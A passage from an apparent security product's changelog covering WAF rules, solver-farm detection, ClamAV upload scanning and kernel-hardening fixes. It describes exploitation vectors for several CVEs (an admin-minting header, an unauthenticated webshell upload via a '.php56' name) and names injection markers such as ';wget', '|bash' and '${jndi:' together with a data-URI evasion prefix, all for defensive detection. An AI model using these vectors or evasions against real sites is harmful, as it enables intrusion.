  and nothing else.

  The evidence cap cannot suppress detection: `MAX_TRACKED_PER_HOST` bounds the
  sample buffer only, while the subnet and IP sets the threshold reads are
  tracked separately — otherwise a cheap flood from one subnet could fill the
  buffer and bury a farm's spread behind it. Truncation is always stated on the
  alert. `EVERY` is clamped to `WINDOW`, since a longer interval would prune part
  of the stream away before it was ever examined (a section omitting `EVERY`
  inherits `[global] DEFAULT_EVERY`, which ships at 60s).

  Two deliberate choices: detection is **not** keyed on User-Agent (it is
  attacker-controlled — the separation holds UA-agnostically, and the UA
  breakdown rides on the alert as attribution evidence instead); and the detector
  never blocks. At ~1 solve per IP a per-IP ban cannot work — the address never
  returns — and the pool is residential, so it risks banning a real customer.
  Acting on a flagged vhost is a separate, deliberate change. Alerts carry
  `ip_scope=host` and `enforcement=observe`; leave `BLOCK` unset on the section
  (it would not block, but it would move the alert onto a path that logs without
  notifying).

  Calibration is one server over one day; `MIN_SUBNETS` is a knob and
  `ALLOW_HOSTS`/`ALLOW_UA_CONTAINS`/`ALLOW_NETS` exempt known-good sources.
  See `docs/DETECTORS.md`.
- **Challenge solves now record the UA and the real solve latency.** Groundwork
  for detecting distributed solver farms — bots that legitimately complete the
  cookie + JS + PoW flow, once per IP, and so stay under every per-IP abuse
  threshold. Two things were missing to spot them:
  - **UA.** `challenge_solved` history events carried only `{uri, diff, ms}`, so
    the forensics UI (which renders `payload.ua`) showed an empty UA column on
    solve rows while WAF rows were populated. A farm's signature is one *exact*
    UA string solving from dozens of ASNs within seconds; without the UA there
    was nothing to correlate on. Now recorded on the event and in
    `cfm.challenges.log` (`ua=`).
  - **Real solve latency** (logged as `solve_ms=`, or `-` when unknown). The
    `ms=` field measured only the verify handler's
    own processing — its timer started when the POST arrived, after the client
    had already solved, which is why solves logged `ms=0`. The PoW token already
    carries its issue timestamp, so the true issue→submit latency needs no new
    server state — but the timestamp was in whole seconds, and an honest browser
    solves the default difficulty in ~1s, rounding the signal away. Tokens are
    now minted with millisecond timestamps and solves log/persist `solve_ms=`
    alongside the unchanged `ms=`. Implausibly fast solves are the one PoW signal
    a native solver cannot fake without surrendering its speed advantage.
    Per-solve values are noisy (solve time is exponentially distributed) — judge
    them per IP/ASN/UA cluster, not per event. A value is reported only when it
    is real: the two timestamps are two readings of the wall clock, so anything
    outside `[0, PoW TTL]` (an NTP step, a VM migration) is recorded as unknown
    rather than as a measurement. Rejecting only negatives would have truncated
    the distribution at exactly the end this signal exists to observe.

  Verification of a token minted by the *previous* binary (whole seconds) is
  preserved by magnitude-detecting the encoding, so a rolling upgrade does not
  fail every in-flight solve for the length of the PoW TTL. The browser-side
  solver is untouched: the token keeps its 58-byte layout and the client never
  read the timestamp field.
- **`cfm php-inventory` — read-only PHP build discovery (SP roadmap P0).** New
  command that enumerates the host's PHP builds across cPanel EA4, CloudLinux
  alt-php, DirectAdmin CustomBuild, LiteSpeed lsphp and system PHP, reporting
  per build its version, thread-safety, module count, and whether Snuffleupagus
  or an Imunify PHP extension is loaded — plus a warning when BOTH are loaded in
  one build (the coexistence hazard). Touches no config; safe to run
  fleet-wide. `--json` for machine consumption. This is the visibility layer
  that sizes the PHP-runtime-defense build matrix before any per-platform work
  (`docs/roadmaps/php-runtime-defense.md`).
- **Dashboard security overview: ClamAV card.** The at-a-glance security row
  gains a fifth tile — **ClamAV infections** — showing infections in the last
  24h with the live scanner state on the sub-line (`async/inline · 24h`,
  `clamd DOWN`, or `scanner off`). It goes red on a fresh infection or when
  clamd is unreachable, and deep-links to the ClamAV page. The 24h figure is a
  windowed COUNT over the persisted history store (new
  `HistoryStore.CountEventsSince`), surfaced as `infections_24h` on the
  admin-only `/api/v1/clam/health` — so it survives a daemon restart and is
  reported even when the scanner is momentarily down. Admin-only, like the rest
  of the security overview.

### Fixed
- **Traffic rules editor: fields were pushed off the right edge of the card.**
  On the *Traffic rules* page the whole rule-editor pane rendered unusable —
  every input sat ~570px past its card boundary, clipped behind the simulation
  pane, and labels no longer lined up with their fields (`Query string` and
  `QS pass-through` landed in the value column). Cause: `.form-grid` sizes its
  label column `max-content` with `white-space: nowrap`, and the long
  "Prefix / `*`-glob match…" hint under **Path patterns** was marked up as a
  bare `<label>` — so it inflated column 1 to its full one-line width and
  shifted the auto-placement of every following cell by one. The hint is now a
  full-row wrapping `.form-hint`, and the two inline checkbox captions use a
  `.form-check` that wraps instead of inheriting the label nowrap.
- **Traffic rules can now match the query string (edge sent path only).** A
  rule like *challenge `/forum/ucp.php?mode=register`* silently never fired: the
  edge (`cfm.lua`) sent `ngx.var.uri` — the path **without** the query string —
  to `/nginx/decision`, so the query never reached the rule engine. The `?`
  embedded in a `path_any` pattern was also treated as a single-char wildcard
  against the path. This left **all** query-string matching dead end-to-end —
  including the `has_qs` ("only match requests that HAVE a query string")
  checkbox and the QS pass-through (`qs_not_rx`) field. Now the edge sends the
  **decoded** path (`ngx.var.uri`, so `path_any` stays un-evadable by
  percent-encoding) and the raw query (`ngx.var.args`) as **separate** RPC
  params — structured transport, so the bridge never re-splits a `path?query`
  concat (a decoded path can itself contain a literal `?`). The decision cache
  key folds in the query so a clean-allow warmed by
  `/x` is never reused for `/x?mode=register` (a query-less request keeps its
  previous path-only cache entry). A `path_any` pattern may embed a `?query`
  suffix — the part before `?` matches the path, the part after matches **per
  query parameter**: each `key=value` token must be present as a parameter with
  that exact (case-insensitive) key and value, and a bare `key` matches any
  value. Both sides are URL-decoded first, so `mode=register` matches an encoded
  `mode=%72egister` (no percent-encode evasion) and `id=5` does **not** match
  `id=50` (no substring over-match). `/forum/ucp.php?mode=register` therefore
  matches `…?mode=register&sid=…`. Static assets still coalesce to one cache
  entry, so only dynamic endpoints pay the per-query cache cardinality. Pinned
  by matcher unit tests and a full edge→bridge decision test.
  **Incompatibility:** a literal `?` in a `path_any` pattern is now the
  path/query separator, not a single-character wildcard as before — an old
  pattern like `/admin?.php` that relied on `?` matching one char must be
  rewritten with `*` (`/admin*.php`). Path wildcards use `*`; `?` is reserved
  for the query.
- **Challenge POST replay now covers multipart forms.** The challenge flow has
  long replayed a challenged POST's body after the challenge solves (that is
  what saved forum posts) — but only for urlencoded/json/text bodies, so
  ticket/forum forms that submit `multipart/form-data` (they carry a file
  field, used or not) still lost the user's text: the same WHMCS incident's
  reply fell through to the challenge server's `note=no_replay` fallback.
  `multipart/form-data` joined the replay allowlist; replay is byte-identical
  (the stored Content-Type keeps the boundary). The 64KB
  `post_resume_max_len` cap is unchanged — a text-only reply fits, a real
  attachment falls back to the previous behaviour — so shared-dict memory
  posture is untouched (tunable via `CFM_POST_RESUME_MAX_LEN`). Guarded by a
  source-level test asserting the allowlist and both size caps.
- **WAF rule 606 (`WAF_HTTP_SMUGGLING`): pasted access-log lines no longer
  challenged.** Support-ticket replies / forum posts / CMS articles that quote
  combined-log lines (`... "GET /path HTTP/1.1" 200 26307 ...`) carry a literal
  request line in the body and tripped the smuggling detector — observed on a
  WHMCS ticket reply, where the challenge also lost the (non-replayable ~1MB
  multipart) reply. The detector now exempts the unambiguous access-log
  fingerprint — the request line wrapped in double quotes AND immediately
  followed by a 3-digit status — and only that: a bare smuggled line, a quoted
  line without a status, or a status without the quote still fire, and a log
  paste cannot mask a separate bare smuggled line elsewhere in the request
  (all pinned by tests). Detector-level fix; the rule stays at challenge.

### Changed
- **cfm-admin: API tokens moved to their own page + nav polish.** Scoped-token
  issuance/revocation left the Vhost-controls page for a dedicated admin-only
  `/cfm-admin/webdetector/tokens/` page (nav: Services → API tokens; hidden
  from scoped users like the other admin pages). The global search palette
  gains per-host quick actions for **Traffic rules** (lands with the rules
  list pre-filtered to the vhost via `?vhost=`) and **ClamAV** (the page's
  existing `?vhost=` view). ClamAV also gets its own nav icon instead of
  sharing the bug icon with Debug. Same APIs everywhere — display-only
  reorganisation; Vhost-controls now holds just the toggles grid and the
  security overview, with links across.

### Changed
- **cfm-admin: Traffic Rules moved to their own page.** The Cloudflare-style
  per-vhost rules (allow/block/challenge/throttle with presets, editor and
  pre-enforcement simulation) left the increasingly crowded Vhost-controls
  page and now live at `/cfm-admin/webdetector/rules/` (nav: Rules & engine →
  Traffic rules). Same scope-filtered `/api/v1/webdet/rules/*` API — nothing
  changes for scoped users or the CLI; the Vhost-controls page keeps the
  toggles grid, scoped tokens and security overview, and links across.

### Fixed
- **The `/api/v1/clam/*` API group was unreachable through the shared
  apiserver — ClamAV page showed "not wired" / empty on live boxes.** The
  shared apiserver mounts the webdetector engine's routes per top-level
  prefix (`/api/v1/webdet/`, `/challenge/`, `/waf/`, `/cpanel/`, `/http3/`),
  and `/api/v1/clam/` was never added — so every clam endpoint (health,
  override, mode, sigignore) fell through to the webui catch-all and returned
  the dashboard HTML instead of JSON. The UI rendered its fail-safe fallbacks
  (scanner "not wired", empty excludes/infections) and the CLI mirrors
  (`cfm clam override|mode|sigignore list`) got HTML; unit tests passed
  because they exercise the engine mux directly. Fixed by adding the prefix,
  and hardened against recurrence: the prefix list now lives next to the
  engine's route table (`webdet.SharedAPIPrefixes`, consumed by the apiserver
  mount), RegisterHTTP is table-driven, and a new test fails any route whose
  prefix is not proxied (this class of bug shipped twice before — `/http3/`,
  then `/clam/`).

### Changed
- **ClamAV upload scanning now defaults to ARCHIVES ONLY (`CLAM_SCAN_SCOPE`).**
  ⚠️ Deliberate coverage change on upgrade: the scanner gates every upload job
  on **magic bytes** and, with the new default `CLAM_SCAN_SCOPE = archives`,
  scans only container formats — zip (which includes docx/xlsx/odt/jar/apk),
  gzip, rar, 7z, xz, bzip2 — the one class the WAF's signature layer genuinely
  cannot inspect. High-volume/low-value uploads (images, video, pdf, plain
  files) are no longer sent to clamd, making fleet-wide scanning viable on busy
  shared servers. `CLAM_SCAN_SCOPE = all` (or `cfm clam scope all`) restores
  the previous full coverage; skipped uploads are counted (`skipped_scope`) on
  the ClamAV page and in `/api/v1/clam/health`. Extensions are never trusted —
  the gate reads the spooled file's leading bytes (plain `.tar` is out of the
  v1 magic set; `.tar.gz` is caught as gzip). Ad-hoc `cfm clam scan <path>`
  CLI scans are unaffected (the gate applies to the upload pipeline only).
- **Hunting-grade ClamAV signatures are now log-only by default
  (`CLAM_SIG_IGNORE`).** ⚠️ Deliberate notification change on upgrade: infected
  verdicts whose signature matches `*_Hunting.UNOFFICIAL` (third-party YARA
  "hunting" rules, FP-prone by design — observed FP:
  `YARA.SIGNATURE_BASE_Brooxml_Hunting.UNOFFICIAL` on a legitimate customer
  `.docx`) are **downgraded to log-only**: still written to `cfm.clam.log` and
  the scoped history (flagged `sig_ignored`, greyed on the ClamAV page), but no
  CLAM/INFECTED email and no quarantine copy — legitimate customer files are no
  longer retained as "evidence" on a hunting-rule match. Set an explicit empty
  `CLAM_SIG_IGNORE =` to act on every verdict. This layer is also the
  prerequisite for future inline blocking (a hunting sig must never 403 a
  customer upload).

### Added
- **ClamAV inline (blocking) upload scanning — `CLAM_SCAN_MODE`, default OFF.**
  A vhost in **inline** mode makes the edge wait (bounded by
  `CLAM_INLINE_TIMEOUT`, default 3s) for the scan verdict and answer **403** on
  an infected upload, instead of only notifying after the fact. Ships
  **disabled** (`CLAM_SCAN_MODE = async` — zero behaviour change on deploy) and
  is **fail-open by contract**: clamd down/hung, circuit breaker open, verdict
  timeout, oversize stream, bridge unreachable — every failure ALLOWS the
  upload and degrades to an async notify-only scan (the file is re-queued), so
  a clamd outage can never take down uploads; the hung-clamd and
  stream-rejected paths have dedicated tests. The scan runs over clamd
  **INSTREAM** (the daemon streams the spooled body; clamd needs no filesystem
  access, no extra pending-dir copy). Policy lives entirely in the daemon — the
  edge obeys a single `block` flag — so inline honours the archive scope gate
  and the signature excludes (a hunting-sig FP can never 403 a customer
  upload), and `/acctxfer*` transfer endpoints never wait on a verdict.
  Burn-in: `CLAM_INLINE_DRY_RUN = 1` scans inline and records what WOULD block
  (log + history `mode=inline_dryrun` + counter) without blocking. Controls:
  `cfm clam mode async|inline` (global), `cfm clam mode add|remove|list <host>`
  (per-vhost XOR flip, scoped API `/api/v1/clam/mode/*` with `[clam_mode]`
  audit trail), a **Clam mode** column + INLINE quick-filter on the
  vhost-controls grid, and scan-mode / inline-blocked cards on the ClamAV page.
  Blocked requests log `clam_block` with `X-CFM-Action: clam_block`. Inline is
  OpenResty-mode only (DNAT has no in-path edge; the knob is a no-op there).
- **Per-signature ClamAV excludes — runtime, global + per-vhost, with full
  CLI/UI.** New sig-ignore store editable with no config edit and no reload:
  `/api/v1/clam/sigignore/{list,add,remove}` (patterns are case-insensitive
  globs on the signature name; matching uses the same matcher the scanner
  enforces with). GLOBAL entries are **admin-only**; a scoped cPanel token may
  add/remove/see only entries for its own vhosts. Every write **and every
  denied out-of-scope attempt** is audit-logged to `cfm.clam.log`
  (`[clam_sigignore]` lines). CLI: `cfm clam sigignore list|add|remove
  <pattern> [--host <vhost>]` (mirrored under `cfm webtop clam sigignore`).
- **ClamAV page: per-signature insights + one-click signature excludes.** The
  cfm-admin ClamAV page gains: a **Signatures** card (per-signature hit count,
  vhosts affected, last seen, notifying/ignored status, admin "Ignore
  globally" action); a **Signature excludes** card (add/remove entries, scoped
  visibility); and per-row **"Ignore sig"** on the Recent-infections table —
  adds an exact-signature exclude for that row's vhost, so an operator (or the
  vhost owner) can neutralise a false positive right where they see it, without
  a whole-vhost scan opt-out. Sig-ignored rows stay visible, greyed with an
  `ignored` badge (and `ignored_by` provenance). The scanner-status card now
  also shows the scan scope and the skipped-by-scope / sig-ignored counters.
- **CLI infection visibility: `cfm clam infections`.** Tabular view of the
  scoped `clam_infected` history (when / vhost / source IP+country / file /
  signature / action taken), with `--host` and `--limit`; works for admin and
  scoped tokens alike. Mirrored under `cfm webtop clam infections`.
- **ClamAV infections are recorded in the scoped history + shown on the ClamAV page.**
  Infected uploads the scanner catches are now persisted into the webdetector
  history store (`event_type=clam_infected`) — preserving the file name, request
  URI and evidence path that the notify audit log drops — and surfaced in a new
  "Recent infections" table on the ClamAV page, scoped so a cPanel user sees only
  their own vhost's infections (via the existing scope-enforced
  `/api/v1/webdet/history/events`). Wiring is a small settable scan-event sink in
  `internal/clam` (the leaf both packages import) that the webdetector engine
  registers on start; only infections are persisted (clean uploads are
  high-volume and covered by the scanner's counters instead). No new endpoint.
- **cfm-admin ClamAV page: scanner status + per-vhost scan coverage.** New
  `/cfm-admin/webdetector/clam/` page (nav: Rules & engine → ClamAV). For admins,
  a **scanner status** card from a new admin-only `GET /api/v1/clam/health`:
  clamd reachability / circuit-breaker state (with down-since + last error),
  queue depth, the global scan default, and lifetime counters (scanned, scan
  errors, breaker-skips, queue drops). For everyone (scoped included), a
  **scan-coverage** card built from the existing scoped `/api/v1/webdet/vhosts`
  rows: how many vhosts are scanned vs not, with a one-click "Enable scan" that
  reuses the scoped `/api/v1/clam/override/*` flip — so a cPanel user can turn
  scanning on for their own vhost.
- **ClamAV scanner resilience: circuit breaker + health prober + down alert.**
  The async upload scanner no longer stalls when clamd is down or hung. A
  circuit breaker opens after a few consecutive scan/probe failures: workers
  then fast-skip (with temp-file cleanup) instead of blocking up to
  `CLAMD_TIMEOUT` on every dial, so a dead clamd can't starve the workers or
  silently fill (and drop) the queue. A background prober pings clamd every 10s
  (bounded 3s) so an outage is detected — and recovery cleared — even with no
  upload traffic, and emits a one-shot **CLAM/DOWN** / **CLAM/UP** notification
  (same `clam` notify section as upload/infected) plus a degraded log heartbeat.
  Lifetime counters (scanned, scan errors, breaker-skips, queue drops) are
  exposed via a new `Manager.Health()` snapshot. `cfm clam status` now bounds
  its reachability ping (≤3s) so it can't hang for the full scan timeout on an
  absent clamd.
- **Per-vhost ClamAV upload-scan toggle + global scan-default.**
  ClamAV upload scanning is now governed by a global policy `CLAM_SCAN_DEFAULT`
  (**default ON**) plus a per-vhost override, mirroring the WAF/Challenge
  per-vhost model: effective per host = `CLAMD_ENABLED && (CLAM_SCAN_DEFAULT XOR
  host-in-override)`. The async (notify-only) scanner has run fleet-wide for
  months, so scanning stays on by upgrade and the override list is an OPT-OUT
  set (exempt a noisy/heavy vhost); set `CLAM_SCAN_DEFAULT = 0` to disable
  server-wide, after which the override list becomes an opt-IN set. Controls:
  `cfm clam scan on|off` (global), `cfm clam override add|remove|list <host>` and
  the mirror `cfm webtop clam override …` (per-vhost). The override API
  (`/api/v1/clam/override/{list,add,remove}`) reuses the identical scoped-vs-admin
  auth as the WAF/Challenge excludes, so a scoped cPanel token can toggle only its
  own vhost. The edge (`cfm_clamav.lua`) reads the global default from the rendered
  config and the override set from the bridge (`/nginx/clam/overrides`, 10s cache),
  and cheap-exits an opted-out vhost before any body read/spool — so scan-off costs
  nothing on the upload path. Scanning here is async/notify-only (non-blocking);
  inline blocking remains a separate future knob (will default OFF).
- **cfm-admin vhost-controls: ClamAV scan column.** The per-vhost controls grid
  (`/cfm-admin` → Controls) gains a **Clam** column alongside Challenge/WAF/HTTP3,
  a **Clam OFF** quick-filter chip and sort key. Each row shows the effective scan
  state (`ON / SCANNING`, `OFF / NOT SCANNED`, or `OFF / GLOBALLY OFF` when ClamAV
  is disabled), computed the same way the edge decides:
  `globallyEnabled && (CLAM_SCAN_DEFAULT XOR override)`. Clicking flips the vhost's
  override via the scoped `/api/v1/clam/override/*` API — so a scoped cPanel user
  can toggle scanning for their own vhost from the UI. The API mirrors the policy
  into the daemon on every config reload, so the grid stays consistent with what
  the edge enforces.
- **ClamAV override changes are audit-logged.** Every
  `/api/v1/clam/override/add|remove` write (vhost-controls / ClamAV page toggle,
  `cfm clam override …`) now writes a `[clam_override]` line to `cfm.clam.log`
  with the action, host, result, actor (admin vs the scoped token's vhost scope)
  and remote address — including **denied out-of-scope attempts**. Upload
  scanning is a protection layer a scoped cPanel token may legitimately switch
  off for its own vhost, so every flip must be reconstructable after the fact.
- **kernsec status: CloudLinux LVE vs. cgroup-mode advisory.** `cfm kernsec
  status` now emits a `[CloudLinux LVE / cgroup mode]` section on CloudLinux
  LVE / CageFS hosts and WARNs when the host is running the unified **cgroup
  v2** hierarchy. LVE needs the cgroup v1 controllers; on pure-unified v2 it
  cannot place processes into its cgroups, so per-tenant limits are silently
  NOT enforced (`dmesg` fills with `os_resource_push … rc=-2` and panels /
  LiteSpeed report bogus "resource limit reached"). The warning points at the
  fix — add `systemd.unified_cgroup_hierarchy=0` to the kernel cmdline and
  reboot. Read-only advisory: kernsec does not manage that operator/distro-owned
  arg, it only surfaces the mismatch so it is caught in `status` instead of
  after a reboot. New probe field `HostProfile.CgroupV2Unified`.

### Changed
- **ClamAV per-vhost override refresh moved fully off the request path.** The
  edge (`cfm_clamav.lua`) used to fetch the override list synchronously from the
  bridge when its 10s per-worker cache expired, pinning one upload request per
  worker per interval to the bridge round-trip (sub-ms healthy, but up to
  ~3×300ms against a *hung* bridge). It now mirrors the `cfm_h3_config.lua`
  refresh model: a stale cache schedules an async `ngx.timer` refresh and the
  request proceeds on the cached set, so the bridge fetch never blocks an
  upload. Fetch failure keeps the last known set; a cold worker serves the empty
  set until the first refresh lands (same fail direction as an unreachable
  bridge before).

### Security
- **WAF upload rules: catch multi-digit `.phpNN` (MultiPHP handler) extensions.**
  The php-executable extension matchers in `_zip_entry_bad_ext` (rule 414),
  `bad_fname` (rule 401) and `_cve_sfl_has_exec_ext` (rules 10001/10010/10014)
  used `%.php%d?` — `.php` plus at most **one** digit — so `.php56`/`.php70`/
  `.php74`/`.php80`/`.php81` slipped through. Those extensions **execute PHP** on
  cPanel/Plesk MultiPHP hosts (the shared-hosting fleet this protects). A captured
  2026-07 SP Page Builder drop used exactly this: an icon-pack zip whose webshell
  hid as `fonts/kamley.php56` (GIF-magic + `<?php`, deflate-compressed so only the
  entry name was in-path-visible) — it passed the WAF signature layer and was
  stopped only by the downstream ClamAV scan. Widened to `%.php%d*` (zero-or-more
  digits); `.phpx`/`.phpfoo` and legit `.svg`/`.woff2`/`.css`/`.png` uploads stay
  clean. Verified against the exact captured payload.

### Added
- **WAF CVE detector: SP Page Builder (Joomla) unauth arbitrary upload → RCE
  (rule 10014, CVE-2026-48908).** The `com_sppagebuilder` `asset.upload*` tasks
  (`uploadCustomIcon`/`uploadImage`/`uploadFont`) have no auth check and no
  server-side file-type restriction (the "ANTONKILL" vector, actively exploited
  2026-07), so an anonymous POST can drop a webshell — seen in the wild uploading
  `payload.zip` (ClamAV: `Win.Trojan.Hide-1`). The detector gates on the
  component + task and flags a php-executable payload via three legs, reusing the
  hardened upload detectors: a php-exec multipart **filename** (rule 401's
  scanner), a php-exec entry **inside the uploaded zip** (rule 414's scanner), or
  raw php webshell **content** (rule 402's scanner). It runs **before** the
  generic upload rules so the hit is attributed to the CVE (nft ban +
  `WAF/CVE-2026-48908` alert). Near-zero FP — a legit icon/image/font upload to
  this endpoint never carries PHP. Defence-in-depth note: a php payload past the
  in-path body-scan budget (`waf_body_max_len`) remains ClamAV's backstop.
- **detectors.conf duration values now accept a `d` (days) unit.** Go's
  `time.ParseDuration` (which CFM used) stops at `h`, so `BLOCK = "7d"`,
  `WINDOW = 3d`, etc. previously failed to parse and *silently* fell back to the
  built-in default. A shared `parseCfgDuration` helper adds a lowercase `d`
  (`1d == 24h`) on top of the stdlib units and is routed through every
  operator-writable duration field — `kvDur` (`EVERY`/`WINDOW`/`COOLDOWN`/
  `TIMEOUT`/…), the `BLOCK` TTL policy, and the mysql `QUERY_RULES` max-time — so
  `d` means the same thing everywhere. Units compose (`1d12h`, `2d30m`) and days
  may be fractional (`1.5d`). No `w`/`y` unit; unreadable values still fall back
  to the default (keep to lowercase `d`).

### Removed
- **kernsec: dropped the `efi=disable_early_pci_dma` boot arg (`KSEC-BOOT-dma-001`,
  group `boot.dma`).** This Tier 1 arg cleared PCI bus-master DMA at
  `ExitBootServices` to close the pre-IOMMU DMA window, but it hung a production
  host at boot: on a UEFI box with an `mdraid` root behind a power-managed PCIe
  controller (already running `pcie_aspm=off pcie_port_pm=off`), cutting early PCI
  DMA stopped the storage controller from assembling the root array, leaving a
  black screen right after the kernel loaded. The kernel's own
  `CONFIG_EFI_DISABLE_PCI_DMA` help text warns it "can cause failures to boot", so
  the availability risk outweighs the narrow benefit for a hosting fleet. `efi` was
  also removed from `ManagedBootArgKeys`, so kernsec no longer owns the `efi` key
  and will not strip an operator's own `efi=` argument. **Operator action:** hosts
  that an earlier kernsec already wrote `efi=disable_early_pci_dma` to will NOT be
  auto-cleaned (kernsec no longer owns the key) — remove it by hand and regenerate
  the bootloader (`sed -i 's/ *efi=disable_early_pci_dma//' /etc/default/grub &&
  grub2-mkconfig -o /boot/grub2/grub.cfg` on legacy-GRUB EL9), or the next reboot
  will hang. A regression guard keeps the arg out of the registry and out of
  `ManagedBootArgKeys` so it cannot silently return. See `docs/kernsec.md` →
  "Removed boot arguments".

### Fixed
- **Web-detector 40x flood autoblocks: don't ban legit heavy clients (success-share
  gate).** The per-IP 40x flood detectors — `404_flood` (`WEB/404`), `403_flood`
  (`WEB/403`) and `40x_combo` (`WEB/40X`) — hard-banned on raw 40x counts, which
  mis-fired on legit bulk workflows: a content-migration/sync tool reading
  `/wp-json/wp/v2/posts/<id>` across an ID range 404s the gaps (each ID a distinct
  path, so it also sailed past `40x_combo`'s unique-path gate). A real Greek user
  was banned for 2h despite being only ~9% 40x — the same IP did hundreds of
  `2xx`/`201 Created`. All three now also require the detector's 40x count to be at
  least `IP40xFloodMinSharePct` of the IP's total window requests (default **25%**):
  a path scanner is almost all 40x and still bans, while a client doing bulk `2xx`
  with incidental 40x is spared. Static assets were already excluded — this adds the
  missing ratio dimension for non-asset REST 40x. `403waf_flood` is intentionally
  NOT gated (WAF-origin 403s are a genuine attack signal). Tunable per section via
  `IP40X_MIN_SHARE_PCT`; a negative value restores the prior count-only behaviour.
- **kernsec: on cPanel securetmp hosts, `EnableMount` no longer adds a
  `/tmp /var/tmp none bind` fstab line for `/var/tmp`.** cPanel securetmp
  (`/usr/tmpDSK`) already binds `/var/tmp` onto its loop-mounted, hardened
  `/tmp` at boot. A kernsec bind line on top of that generated a systemd
  `var-tmp.mount` that RACED securetmp: an early auto-mount pinned the
  pre-securetmp root `/tmp`, and once securetmp rebuilt `/tmp` on its loop
  device that bind was orphaned onto a **dead inode** — after which every
  `PrivateTmp=yes` service (mysqld, named, php-fpm, nginx, exim, memcached, …)
  failed to start with `Result: resources` because it could not create its
  `/var/tmp/systemd-private-*` dir. kernsec now detects `/usr/tmpDSK` and
  defers `/var/tmp` to securetmp entirely (the clean reference state), while
  non-securetmp hosts keep the existing bind-line behaviour. Also corrected a
  stale in-code comment (`mounts.go` claimed `/tmp` and `/var/tmp` "do NOT get
  CanEnable" while both are `CanEnable: true`) and a stale `docs/kernsec.md`
  claim that kernsec "never mutates fstab" for those paths.
- **kernsec: `secure-tmp` fstab lines now carry `nofail`** (boot-availability
  audit follow-up to the `efi=disable_early_pci_dma` incident). Without
  `nofail`, the `/var/tmpDSK → /tmp` loop mount is a hard requirement of
  systemd's `local-fs.target`, so a damaged or deleted backing file (its fsck
  pass is 0 — the embedded ext4 is never checked) dropped the host into
  emergency mode at boot: no SSH, console-only recovery. With `nofail` the host
  still boots and `/tmp` temporarily falls back to a plain (unhardened) root
  directory instead — reachable over SSH and fixable. **Operator action:** hosts
  where `secure-tmp` ran before this change should add `nofail` to both kernsec
  lines in `/etc/fstab` by hand. A test now guards the option so it cannot be
  dropped.
- **kernsec: the interactive `apply` preflight now names the Tier 2
  `oops=panic` reboot-loop risk** before the y/N prompt: with
  `kernel.panic_on_oops=1` + `kernel.panic=10`, an oops **during boot** (e.g. a
  driver regression after a kernel update) becomes a panic/reboot loop
  recoverable only from the console. Previously the preflight only surfaced the
  init_on_alloc/init_on_free perf notes and a generic bootloader line.

### Changed
- **WAF PHP stream-wrapper rule (305, `WAF_PHP_WRAPPER`) promoted to `block` and
  armed for autoblock.** `php://`/`phar://`/`data://`/`zip://`/`expect://`/`glob://`
  in request args or body is the primary sink for LFI→RCE and CVE-2024-4577-style
  php-cgi injection, and no benign app sends those, so the rule moves from
  `challenge` to edge-`block`. Because it now has an edge-block rule, `WAF_PHP_WRAPPER`
  auto-arms in `waf_security` (`PHP_WRAPPER = 1`): a hit gets a 6h soft nft ban plus
  a Slack/mail alert. The detector scans args/body only (not the URL path) and
  matches `data://` (the stream wrapper), **not** `data:` image/JS URIs, so inline
  data-URI page assets do not trip it. Opt back out per-vhost with
  `rule_php_wrappers = "challenge"` or hold the ban with `PHP_WRAPPER = 0`.

### Fixed
- **WAF RCE rule (320, `WAF_RCE`) no longer evadable behind a `data:` URI path
  prefix.** The `data:`-URI false-positive carve-out (added so a base64 image
  data: URI a browser resolved as a relative path couldn't trip the block-tier
  RCE rule) was applied too broadly: RCE scanned the payload-stripped surface,
  so structural markers that are *never* valid inside a base64/image/JS data:
  payload — `${jndi:…}` (Log4Shell), `;wget`/`;curl`/`|bash` — could be smuggled
  past rule 320 by prefixing them with `/data:image/x,…`. RCE now scans the raw
  surface again; the one genuine data: FP (a base64 blob whose letters spell
  `eval`/`exec`/`system`) stays suppressed by the detector's existing
  paren-anchored + `uri_is_data_uri_path` inline guard, so no FP returns. XSS
  (302) keeps the broader strip (its `on…=`/`<script` markers legitimately
  appear in data: payloads). Traversal was never affected.

### Added
- **Two new WAF CVE detectors (family `WAF_CVE`), both edge-`block` + armed
  autoblock.** Each nft-bans the source for 6h and raises a `WAF/CVE-YYYY-NNNN`
  Slack/mail alert on a hit:
  - **WooCommerce Payments auth-bypass → privesc, `CVE-2023-28121`** (rule 10012,
    plugin 4.8.0–5.6.1). The plugin trusts the `X-WCPAY-Platform-Checkout-User`
    request header as the current user id with no validation, so an
    unauthenticated attacker sets it to `1` and mints an admin. Keyed on header
    presence (all methods / all paths) — the header is server-set by WooPay only,
    so a real client never sends it (near-zero FP). A site that genuinely runs
    WooPay should exempt WooPay's source nets with `waf_security` `ALLOW_NETS`.
  - **Gravity SMTP unauthenticated sensitive-info exposure, `CVE-2026-4020`**
    (rule 10013, plugin ≤ 2.1.4). The REST route
    `/gravitysmtp/v1/tests/mock-data` ships `permission_callback=true` and dumps
    the full System Report (PHP/DB/server versions, absolute paths, active
    plugins/theme, DB table names, connector API keys/tokens). Keyed on the
    plugin-unique route (pretty and `?rest_route=` permalink forms) plus an
    UNAUTH gate — the only legit caller is the wp-admin settings screen, which
    carries the WP logged-in cookie.
- **Webdetector history: hard row cap (`HISTORY_MAX_ROWS`, default 1M) +
  sane sqlite maintenance.** Retention was time-based only, so a busy box
  grew the history DB into hundreds of MB (titan: 394 MB **plus a 396 MB
  WAL**) even at 7 retention days. The hourly pruner now also enforces a
  row cap (newest kept; `0` disables; ~1M rows ≈ 150-200 MB), and the
  maintenance pass is fixed: VACUUM only runs when ≥20% of pages and ≥8 MB
  are actually reclaimable (it used to rewrite the whole DB **every hour**),
  the WAL checkpoint (TRUNCATE) runs *after* VACUUM instead of before (the
  old order left a WAL as large as the DB sitting on disk permanently), and
  `journal_size_limit=64MB` caps the WAL between checkpoints. `history/stats`
  reports the cap (`max_rows`).

### Fixed
- **WAF XSS/RCE (rules 302/320): stop false-positiving on `data:` URIs in the
  request path.** A browser or link-preview crawler that resolves an inline
  `<img src="data:…">` / `<script src="data:…">` as a *relative* link makes the
  origin receive the data: payload as a URL path. That payload is inert
  server-side (it 404s, is never executed or reflected), but its content tripped
  the content-injection rules: **RCE (320, block-tier)** on `base64,` plus a
  coincidental `eval`/`exec`/`system` substring inside the base64 (all valid
  base64 chars — so it hit **any** `data:*;base64` type: png/jpg/webp/gif/svg/woff2),
  and **XSS (302)** on inline `on…=`/`<script` in a `data:text/javascript,` body.
  Confirmed in production: a Greek Vodafone user was **blocked + ban-listed** on a
  WooCommerce product page (rule 320), and `facebookexternalhit` was repeatedly
